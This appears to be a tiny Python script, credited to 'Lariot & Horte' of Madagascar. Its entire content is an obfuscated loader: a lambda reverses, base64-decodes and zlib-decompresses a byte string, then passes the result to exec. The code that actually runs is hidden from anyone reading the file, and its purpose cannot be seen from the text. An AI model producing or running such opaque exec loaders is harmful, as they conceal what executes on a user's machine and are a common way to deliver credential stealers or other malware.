
# Code By Lariot & Horte

# Country: Madagasikara
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AlfoQDAQA1XXlSwnq9wLLKLkQSxJfLIoa82nULxnAyMKvr2RT80jqKM4K82kS9JEDLOzctxjAsykCNMiSCIIrq0zMjw64K3xQ9xoM9N0gd33gDWbv80xQcMgkyN9sUIR91ICt1NhUrLxJe'))